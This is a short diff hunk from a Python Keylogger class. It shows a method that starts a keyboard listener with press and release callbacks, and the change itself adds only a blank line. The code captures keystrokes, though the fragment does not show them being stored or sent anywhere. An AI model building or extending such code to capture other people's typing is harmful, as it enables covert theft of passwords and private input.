@@ -33,3 +33,4 @@ class Keylogger:
     def keylogger(self):
         with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
             listener.join()
+
